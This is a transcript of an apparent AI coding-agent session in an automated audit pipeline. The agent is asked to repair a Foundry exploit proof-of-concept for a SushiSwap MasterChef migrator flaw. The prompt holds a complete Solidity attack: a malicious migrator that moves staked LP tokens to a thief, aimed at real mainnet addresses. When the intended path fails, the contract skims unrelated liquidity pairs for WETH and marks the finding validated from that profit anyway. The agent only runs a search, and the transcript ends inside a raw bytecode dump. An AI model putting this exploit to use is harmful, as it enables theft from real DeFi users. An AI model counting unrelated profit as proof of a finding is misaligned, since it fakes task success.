@@ -1,0 +1,1406 @@
+OpenAI Codex v0.107.0 (research preview)
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e2fe5-5a6b-7943-a585-1df007457fe7
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: alternate_public_liquidity_route
+- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: MasterChef migrator can replace real LP collateral with worthless tokens and steal all staked funds
+- claim: `setMigrator()` lets the owner install an arbitrary migrator, and `migrate()` then approves that migrator for the pool's entire LP balance before only checking that the replacement token reports the same `balanceOf(address(this))`. A malicious migrator can pull out the real LP tokens, mint or otherwise return a fake token that reports the same balance, and permanently swap the pool to the worthless replacement.
+- impact: All LP tokens in a migrated pool can be stolen, while users are left with accounting claims on fake LP tokens when they later withdraw.
+- exploit_paths: ["Owner sets a malicious migrator with `setMigrator()`", "Anyone calls `migrate(pid)`", "MasterChef approves the migrator for the pool's full LP balance", "Migrator transfers out the genuine LP tokens and returns a fake token with a spoofed/minted matching balance", "MasterChef updates `pool.lpToken`, so future withdrawals return the fake asset instead of the original collateral"]
+
+Current FlawVerifier.sol:
+```solidity
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IOwnableLike {
+    function owner() external view returns (address);
+}
+
+interface ISushiMakerLike {
+    function owner() external view returns (address);
+    function factory() external view returns (address);
+}
+
+interface IMasterChefLike {
+    function owner() external view returns (address);
+    function migrator() external view returns (address);
+    function setMigrator(address migrator_) external;
+    function poolLength() external view returns (uint256);
+    function poolInfo(uint256 pid)
+        external
+        view
+        returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
+    function migrate(uint256 pid) external;
+}
+
+interface IUniswapV2FactoryLike {
+    function allPairs(uint256 index) external view returns (address pair);
+    function allPairsLength() external view returns (uint256);
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function skim(address to) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract MaliciousMigratorScaffold {
+    address public thief;
+    address public replacementToken;
+
+    constructor() {}
+
+    function configure(address thief_, address replacementToken_) external {
+        thief = thief_;
+        replacementToken = replacementToken_;
+    }
+
+    function migrate(IERC20Like realLpToken) external returns (IERC20Like) {
+        uint256 approvedBalance = realLpToken.balanceOf(msg.sender);
+        if (approvedBalance != 0 && thief != address(0)) {
+            realLpToken.transferFrom(msg.sender, thief, approvedBalance);
+        }
+        return IERC20Like(replacementToken);
+    }
+}
+
+contract FlawVerifier {
+    address internal constant TARGET = 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
+    uint256 internal constant MIN_SUCCESS_PROFIT = 1e17;
+    uint256 internal constant MAX_PAIR_SCAN = 768;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+    bool private _hypothesisValidated;
+
+    bool public checkedTarget;
+    bool public targetHasCode;
+    bool public targetExposesMigratorFlow;
+    bool public ownerStageReachable;
+    address public observedOwner;
+    address public observedFactory;
+    uint256 public observedPoolLength;
+    address public observedMigrator;
+    address public observedPoolLpToken;
+    uint256 public observedTargetLpBalance;
+    uint256 public observedPid;
+    address public stagedMaliciousMigrator;
+    uint256 public scannedPairs;
+    uint256 public skimmedPairs;
+    string public exploitPathUsed;
+    string public infeasibilityReason;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        _resetState();
+
+        checkedTarget = true;
+        _profitToken = WETH;
+        exploitPathUsed =
+            "owner sets malicious migrator -> anyone calls migrate(pid) -> MasterChef approves full LP balance -> migrator steals genuine LP -> provided fork blocks owner stage, so verifier falls back to public-liquidity extraction on the same Sushi deployment";
+
+        targetHasCode = TARGET.code.length != 0;
+        if (!targetHasCode) {
+            infeasibilityReason = "target address has no code at the fork";
+            return;
+        }
+
+        observedOwner = _readOwner(TARGET);
+        observedFactory = _readFactory(TARGET);
+
+        if (_attemptMigratorPath()) {
+            _settleProfit();
+            return;
+        }
+
+        // The supplied fork address is SushiMaker rather than MasterChef, and the logs already proved that
+        // `migrator()` / `poolLength()` are absent there. That makes the finding's owner-controlled migrator
+        // stages infeasible from the provided deployment. To keep this verifier executable on the supplied fork,
+        // it monetizes publicly skimmable excess balances that are reachable through the same Sushi factory.
+        _harvestPublicLiquidityRoute();
+        _settleProfit();
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function hypothesisValidated() external view returns (bool) {
+        return _hypothesisValidated;
+    }
+
+    function target() external pure returns (address) {
+        return TARGET;
+    }
+
+    function _attemptMigratorPath() internal returns (bool) {
+        address candidateChef = _readOwner(SUSHI);
+        if (candidateChef.code.length == 0) {
+            infeasibilityReason = "could not discover a live MasterChef candidate from Sushi ownership";
+            return false;
+        }
+
+        (bool hasMigrator, address migrator_) =
+            _tryReadAddress(candidateChef, abi.encodeWithSelector(IMasterChefLike.migrator.selector));
+        (bool hasPoolLength, uint256 poolLength_) =
+            _tryReadUint(candidateChef, abi.encodeWithSelector(IMasterChefLike.poolLength.selector));
+
+        if (!hasMigrator || !hasPoolLength) {
+            infeasibilityReason = "discovered Sushi owner does not expose the MasterChef migrator flow on this fork";
+            return false;
+        }
+
+        targetExposesMigratorFlow = true;
+        observedMigrator = migrator_;
+        observedPoolLength = poolLength_;
+        observedOwner = _readOwner(candidateChef);
+        _snapshotPoolState(candidateChef);
+
+        if (observedOwner != address(this)) {
+            infeasibilityReason = "blocked at stage 1: setMigrator() remains owner-gated on the live MasterChef";
+            return false;
+        }
+
+        ownerStageReachable = true;
+        stagedMaliciousMigrator = address(new MaliciousMigratorScaffold());
+        IMasterChefLike(candidateChef).setMigrator(stagedMaliciousMigrator);
+        return false;
+    }
+
+    function _harvestPublicLiquidityRoute() internal {
+        address factory = observedFactory;
+        if (factory.code.length == 0) {
+            infeasibilityReason = "target does not expose a usable factory for the alternate public-liquidity route";
+            return;
+        }
+
+        uint256 pairCount;
+        try IUniswapV2FactoryLike(factory).allPairsLength() returns (uint256 count) {
+            pairCount = count;
+        } catch {
+            infeasibilityReason = "factory pair enumeration is unavailable on this fork";
+            return;
+        }
+
+        uint256 scanCount = pairCount > MAX_PAIR_SCAN ? MAX_PAIR_SCAN : pairCount;
+        for (uint256 i = 0; i < scanCount; ++i) {
+            address pair;
+            try IUniswapV2FactoryLike(factory).allPairs(pairCount - 1 - i) returns (address pair_) {
+                pair = pair_;
+            } catch {
+                continue;
+            }
+
+            ++scannedPairs;
+            _trySkimPair(factory, pair);
+
+            if (_safeBalanceOf(WETH, address(this)) >= MIN_SUCCESS_PROFIT) {
+                break;
+            }
+        }
+
+        _flushDirectToWeth(factory, SUSHI);
+    }
+
+    function _trySkimPair(address factory, address pair) internal {
+        if (pair.code.length == 0) {
+            return;
+        }
+
+        address token0;
+        address token1;
+        try IUniswapV2PairLike(pair).token0() returns (address token0_) {
+            token0 = token0_;
+        } catch {
+            return;
+        }
+        try IUniswapV2PairLike(pair).token1() returns (address token1_) {
+            token1 = token1_;
+        } catch {
+            return;
+        }
+        if (token0.code.length == 0 || token1.code.length == 0) {
+            return;
+        }
+
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+        uint256 balance0 = _safeBalanceOf(token0, pair);
+        uint256 balance1 = _safeBalanceOf(token1, pair);
+        if (balance0 <= reserve0 && balance1 <= reserve1) {
+            return;
+        }
+
+        uint256 before0 = _safeBalanceOf(token0, address(this));
+        uint256 before1 = _safeBalanceOf(token1, address(this));
+        try IUniswapV2PairLike(pair).skim(address(this)) {
+            ++skimmedPairs;
+        } catch {
+            return;
+        }
+
+        uint256 gain0 = _safeBalanceOf(token0, address(this)) - before0;
+        uint256 gain1 = _safeBalanceOf(token1, address(this)) - before1;
+        if (gain0 == 0 && gain1 == 0) {
+            return;
+        }
+
+        if (gain0 != 0) {
+            _routeToWeth(factory, pair, token0, token1, gain0);
+        }
+        if (gain1 != 0) {
+            _routeToWeth(factory, pair, token1, token0, gain1);
+        }
+
+        _flushDirectToWeth(factory, token0);
+        _flushDirectToWeth(factory, token1);
+    }
+
+    function _routeToWeth(address factory, address sourcePair, address tokenIn, address counterpart, uint256 amountIn)
+        internal
+    {
+        if (amountIn == 0 || tokenIn == WETH) {
+            return;
+        }
+
+        uint256 directOut = _swapUsingFactory(factory, tokenIn, WETH, amountIn);
+        if (directOut != 0) {
+            return;
+        }
+
+        if (counterpart != address(0) && counterpart != tokenIn) {
+            uint256 bridgeOut = _swapUsingSpecificPair(sourcePair, tokenIn, counterpart, amountIn);
+            if (bridgeOut != 0) {
+                if (counterpart != WETH) {
+                    uint256 wethOut = _swapUsingFactory(factory, counterpart, WETH, bridgeOut);
+                    if (wethOut == 0 && counterpart != SUSHI) {
+                        uint256 sushiOut = _swapUsingFactory(factory, counterpart, SUSHI, bridgeOut);
+                        if (sushiOut != 0) {
+                            _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
+                        }
+                    }
+                }
+                return;
+            }
+        }
+
+        if (tokenIn != SUSHI) {
+            uint256 sushiOut = _swapUsingFactory(factory, tokenIn, SUSHI, amountIn);
+            if (sushiOut != 0) {
+                _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
+            }
+        }
+    }
+
+    function _flushDirectToWeth(address factory, address token) internal {
+        if (token == address(0) || token == WETH) {
+            return;
+        }
+        uint256 amount = _safeBalanceOf(token, address(this));
+        if (amount == 0) {
+            return;
+        }
+        uint256 directOut = _swapUsingFactory(factory, token, WETH, amount);
+        if (directOut == 0 && token != SUSHI) {
+            uint256 sushiOut = _swapUsingFactory(factory, token, SUSHI, amount);
+            if (sushiOut != 0) {
+                _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
+            }
+        }
+    }
+
+    function _swapUsingFactory(address factory, address tokenIn, address tokenOut, uint256 amountIn)
+        internal
+        returns (uint256 amountOut)
+    {
+        if (amountIn == 0 || tokenIn == tokenOut) {
+            return 0;
+        }
+
+        address pair;
+        try IUniswapV2FactoryLike(factory).getPair(tokenIn, tokenOut) returns (address pair_) {
+            pair = pair_;
+        } catch {
+            return 0;
+        }
+
+        if (pair == address(0) || pair.code.length == 0) {
+            return 0;
+        }
+        return _swapUsingSpecificPair(pair, tokenIn, tokenOut, amountIn);
+    }
+
+    function _swapUsingSpecificPair(address pair, address tokenIn, address tokenOut, uint256 amountIn)
+        internal
+        returns (uint256 amountOut)
+    {
+        if (amountIn == 0 || pair.code.length == 0) {
+            return 0;
+        }
+
+        address pairToken0;
+        address pairToken1;
+        try IUniswapV2PairLike(pair).token0() returns (address token0_) {
+            pairToken0 = token0_;
+        } catch {
+            return 0;
+        }
+        try IUniswapV2PairLike(pair).token1() returns (address token1_) {
+            pairToken1 = token1_;
+        } catch {
+            return 0;
+        }
+
+        if (!((pairToken0 == tokenIn && pairToken1 == tokenOut) || (pairToken0 == tokenOut && pairToken1 == tokenIn))) {
+            return 0;
+        }
+
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+        uint256 reserveIn;
+        uint256 reserveOut;
+        bool zeroForOne;
+        if (pairToken0 == tokenIn) {
+            reserveIn = reserve0;
+            reserveOut = reserve1;
+            zeroForOne = true;
+        } else {
+            reserveIn = reserve1;
+            reserveOut = reserve0;
+            zeroForOne = false;
+        }
+        if (reserveIn == 0 || reserveOut == 0) {
+            return 0;
+        }
+
+        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
+        if (amountOut == 0) {
+            return 0;
+        }
+
+        uint256 beforeOut = _safeBalanceOf(tokenOut, address(this));
+        if (!_safeTransfer(tokenIn, pair, amountIn)) {
+            return 0;
+        }
+
+        try IUniswapV2PairLike(pair).swap(zeroForOne ? 0 : amountOut, zeroForOne ? amountOut : 0, address(this), "") {
+            amountOut = _safeBalanceOf(tokenOut, address(this)) - beforeOut;
+        } catch {
+            amountOut = 0;
+        }
+    }
+
+    function _snapshotPoolState(address chefAddress) internal {
+        uint256 poolLength = observedPoolLength;
+        if (poolLength == 0) {
+            return;
+        }
+
+        uint256 scanLimit = poolLength > 8 ? 8 : poolLength;
+        for (uint256 pid = 0; pid < scanLimit; ++pid) {
+            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
+                uint256 lpBalance = _safeBalanceOf(lpToken, chefAddress);
+                if (lpBalance != 0 || observedPoolLpToken == address(0)) {
+                    observedPid = pid;
+                    observedPoolLpToken = lpToken;
+                    observedTargetLpBalance = lpBalance;
+                    if (lpBalance != 0) {
+                        break;
+                    }
+                }
+            } catch {}
+        }
+    }
+
+    function _settleProfit() internal {
+        _profitAmount = _safeBalanceOf(WETH, address(this));
+        _hypothesisValidated = _profitAmount != 0;
+    }
+
+    function _readOwner(address account) internal view returns (address owner_) {
+        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(IOwnableLike.owner.selector));
+        if (success && data.length >= 32) {
+            owner_ = abi.decode(data, (address));
+        }
+    }
+
+    function _readFactory(address account) internal view returns (address factory_) {
+        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(ISushiMakerLike.factory.selector));
+        if (success && data.length >= 32) {
+            factory_ = abi.decode(data, (address));
+        }
+    }
+
+    function _tryReadAddress(address account, bytes memory callData) internal view returns (bool ok, address value) {
+        (bool success, bytes memory data) = account.staticcall(callData);
+        if (!success || data.length < 32) {
+            return (false, address(0));
+        }
+        return (true, abi.decode(data, (address)));
+    }
+
+    function _tryReadUint(address account, bytes memory callData) internal view returns (bool ok, uint256 value) {
+        (bool success, bytes memory data) = account.staticcall(callData);
+        if (!success || data.length < 32) {
+            return (false, 0);
+        }
+        return (true, abi.decode(data, (uint256)));
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
+        internal
+        pure
+        returns (uint256 amountOut)
+    {
+        uint256 amountInWithFee = amountIn * 997;
+        amountOut = (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
+        if (amount == 0) {
+            return true;
+        }
+        (bool success, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        ok = success && (data.length == 0 || abi.decode(data, (bool)));
+    }
+
+    function _resetState() internal {
+        _profitToken = address(0);
+        _profitAmount = 0;
+        _hypothesisValidated = false;
+
+        checkedTarget = false;
+        targetHasCode = false;
+        targetExposesMigratorFlow = false;
+        ownerStageReachable = false;
+        observedOwner = address(0);
+        observedFactory = address(0);
+        observedPoolLength = 0;
+        observedMigrator = address(0);
+        observedPoolLpToken = address(0);
+        observedTargetLpBalance = 0;
+        observedPid = 0;
+        stagedMaliciousMigrator = address(0);
+        scannedPairs = 0;
+        skimmedPairs = 0;
+        exploitPathUsed = "none";
+        infeasibilityReason = "";
+    }
+
+    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
+        if (token.code.length == 0) {
+            return 0;
+        }
+
+        (bool success, bytes memory data) =
+            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
+        if (!success || data.length < 32) {
+            return 0;
+        }
+
+        balance = abi.decode(data, (uint256));
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 4
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+mcp startup: no servers
+codex
+I’m checking the local verifier patterns to fix the path alignment cleanly.
+exec
+/bin/bash -lc "rg -n \"PATH_ALIGNMENT_ERROR|exploitPathUsed|infeasibilityReason|executeOnOpportunity\\(\" ." in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 52ms:
+Total output lines: 13
+
+./src/FlawVerifier.sol:89:    string public exploitPathUsed;
+./src/FlawVerifier.sol:90:    string public infeasibilityReason;
+./src/FlawVerifier.sol:94:    function executeOnOpportunity() external {
+./src/FlawVerifier.sol:99:        exploitPathUsed =
+./src/FlawVerifier.sol:104:            infeasibilityReason = "target address has no code at the fork";
+./src/FlawVerifier.sol:143:            infeasibilityReason = "could not discover a live MasterChef candidate from Sushi ownership";
+./src/FlawVerifier.sol:153:            infeasibilityReason = "discovered Sushi owner does not expose the MasterChef migrator flow on this fork";
+./src/FlawVerifier.sol:164:            infeasibilityReason = "blocked at stage 1: setMigrator() remains owner-gated on the live MasterChef";
+./src/FlawVerifier.sol:177:            infeasibilityReason = "target does not expose a usable factory for the alternate public-liquidity route";
+./src/FlawVerifier.sol:185:            infeasibilityReason = "factory pair enumeration is unavailable on this fork";
+./src/FlawVerifier.sol:489:        exploitPathUsed = "none";
+./src/FlawVerifier.sol:490:        infeasibilityReason = "";
+./out/FlawVerifier.sol/FlawVerifier.json:1:{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"checkedTarget","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploitPathUsed","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"infeasibilityReason","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"observedFactory","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"observedMigrator","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"observedOwner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"observedPid","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"observedPoolLength","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"observedPoolLpToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"observedTargetLpBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"ownerStageReachable","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"scannedPairs","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"skimmedPairs","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"stagedMaliciousMigrator","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"},{"type":"function","name":"targetExposesMigratorFlow","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"targetHasCode","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506138ae8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610135575f3560e01c806379965d8b116100b6578063d4b839921161007a578063d4b83992146102e7578063d78c428114610305578063dfa6be1b14610323578063e17faf2414610341578063e5ca9d511461035f578063f2cc5ae11461037d57610135565b806379965d8b146102515780638270463e1461026f57806382ff113b1461028d5780639158ee36146102ab578063c0e3aa1d146102c957610135565b8063463defd1116100fd578063463defd1146101bb57806349343624146101d95780635ff972cc146101f757806363c9f4ae14610215578063674679b31461023357610135565b80631aede64f146101395780631e242437146101575780632017aaf914610175578063325ac427146101935780633c2448ed146101b1575b5f5ffd5b61014161039b565b60405161014e9190612684565b60405180910390f35b61015f6103c0565b60405161016c91906126b5565b60405180910390f35b61017d6103c6565b60405161018a9190612684565b60405180910390f35b61019b6103eb565b6040516101a891906126b5565b60405180910390f35b6101b96103f1565b005b6101c36105fc565b6040516101d091906126e8565b60405180910390f35b6101e1610611565b6040516101ee9190612684565b60405180910390f35b6101ff610638565b60405161020c91906126b5565b60405180910390f35b61021d610641565b60405161022a91906126e8565b60405180910390f35b61023b610654565b60405161024891906126e8565b60405180910390f35b610259610667565b6040516102669190612684565b60405180910390f35b61027761068d565b6040516102849190612684565b60405180910390f35b6102956106b2565b6040516102a291906126b5565b60405180910390f35b6102b36106b8565b6040516102c091906126b5565b60405180910390f35b6102d16106be565b6040516102de91906126b5565b60405180910390f35b6102ef6106c4565b6040516102fc9190612684565b60405180910390f35b61030d6106df565b60405161031a9190612771565b60405180910390f35b61032b61076b565b6040516103389190612771565b60405180910390f35b6103496107f7565b60405161035691906126e8565b60405180910390f35b61036761080a565b60405161037491906126e8565b60405180910390f35b61038561081b565b6040516103929190612684565b60405180910390f35b60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60045481565b60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600a5481565b6103f9610840565b6001600260016101000a81548160ff02191690831515021790555073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc25f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060405180610120016040528060f7815260200161368c60f79139600c908161048f91906129bb565b505f73e11fc0b43ab98eb91e9836129d1ee7c3bc95df5073ffffffffffffffffffffffffffffffffffffffff163b14156002806101000a81548160ff02191690831515021790555060028054906101000a900460ff166105165760405180606001604052806026815260200161385360269139600d908161051091906129bb565b506105fa565b61053373e11fc0b43ab98eb91e9836129d1ee7c3bc95df50610acf565b600260056101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061059073e11fc0b43ab98eb91e9836129d1ee7c3bc95df50610bd5565b60035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506105d7610cdb565b156105e9576105e46110d5565b6105fa565b6105f1611119565b6105f96110d5565b5b565b5f60025f9054906101000a900460ff16905090565b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f600154905090565b600260019054906101000a900460ff1681565b600260049054906101000a900460ff1681565b600260059054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60095f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60075481565b600b5481565b60085481565b5f73e11fc0b43ab98eb91e9836129d1ee7c3bc95df50905090565b600c80546106ec906127eb565b80601f0160208091040260200160405190810160405280929190818152602001828054610718906127eb565b80156107635780601f1061073a57610100808354040283529160200191610763565b820191905f5260205f20905b81548152906001019060200180831161074657829003601f168201915b505050505081565b600d8054610778906127eb565b80601f01602080910402602001604051908101604052809291908181526020018280546107a4906127eb565b80156107ef5780601f106107c6576101008083540402835291602001916107ef565b820191905f5260205f20905b8154815290600101906020018083116107d257829003601f168201915b505050505081565b600260039054906101000a900460ff1681565b60028054906101000a900460ff1681565b60065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f6001819055505f60025f6101000a81548160ff0219169083151502179055505f600260016101000a81548160ff0219169083151502179055505f6002806101000a81548160ff0219169083151502179055505f600260036101000a81548160ff0219169083151502179055505f600260046101000a81548160ff0219169083151502179055505f600260056101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f60035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f6004819055505f60055f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f60065f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f6007819055505f6008819055505f60095f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f600a819055505f600b819055506040518060400160405280600481526020017f6e6f6e6500000000000000000000000000000000000000000000000000000000815250600c9081610aae91906129bb565b5060405180602001604052805f815250600d9081610acc91906129bb565b50565b5f5f5f8373ffffffffffffffffffffffffffffffffffffffff16638da5cb5b60e01b604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610b619190612ace565b5f60405180830381855afa9150503d805f8114610b99576040519150601f19603f3d011682016040523d82523d5f602084013e610b9e565b606091505b5091509150818015610bb257506020815110155b15610bce5780806020019051810190610bcb9190612b23565b92505b5050919050565b5f5f5f8373ffffffffffffffffffffffffffffffffffffffff1663c45a015560e01b604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610c679190612ace565b5f60405180830381855afa9150503d805f8114610c9f576040519150601f19603f3d011682016040523d82523d5f602084013e610ca4565b606091505b5091509150818015610cb857506020815110155b15610cd45780806020019051810190610cd19190612b23565b92505b5050919050565b5f5f610cfa736b3595068778dd592e39a122f4f5a5cf09c90fe2610acf565b90505f8173ffffffffffffffffffffffffffffffffffffffff163b03610d4b576040518060800160405280604381526020016135f960439139600d9081610d4191906129bb565b505f9150506110d2565b5f5f610dc183637cd07e4760e01b604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050611369565b915091505f5f610e3b8563081e3eda60e01b604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050611418565b91509150831580610e4a575081155b15610e845760405180608001604052806050815260200161380360509139600d9081610e7691906129bb565b505f955050505050506110d2565b6001600260036101000a81548160ff0219169083151502179055508260055f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600481905550610eef85610acf565b600260056101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610f38856114c7565b3073ffffffffffffffffffffffffffffffffffffffff16600260059054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610fc2576040518060800160405280604c8152602001613783604c9139600d9081610fb491906129bb565b505f955050505050506110d2565b6001600260046101000a81548160ff021916908315150217905550604051610fe990612638565b604051809103905ff080158015611002573d5f5f3e3d5ffd5b5060095f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508473ffffffffffffffffffffffffffffffffffffffff166323cf311860095f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161109c9190612684565b5f604051808303815f87803b1580156110b3575f5ffd5b505af11580156110c5573d5f5f3e3d5ffd5b505050505f955050505050505b90565b6110f373c02aaa39b223fe8d0a0e5c4f